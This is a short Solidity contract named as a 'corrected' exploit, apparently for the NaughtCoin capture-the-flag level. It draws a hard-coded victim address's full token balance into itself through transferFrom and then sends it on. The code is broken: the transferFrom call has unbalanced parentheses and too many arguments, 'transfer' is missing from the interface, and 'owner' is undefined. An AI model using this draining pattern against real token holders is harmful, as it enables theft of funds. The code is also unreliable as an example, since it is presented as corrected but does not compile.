pragma solidity ^0.8.0;

interface INaughtCoin {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract NaughtCoinExploitCorrected {
    INaughtCoin public token;
    address public victim = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    
    constructor(address _tokenAddress) {
        token = INaughtCoin(_tokenAddress);
    }

    function drainTokens() public {
        uint256 amount = token.balanceOf(victim);
        token.transferFrom(victim, address(0x7c52A927B874adD4803C7D5e68c55C48D2977c47, address(this), amount);
        
    }

    function transferToNewOwner() public {
        token.transfer(owner, token.balanceOf(address(this)));
    }
}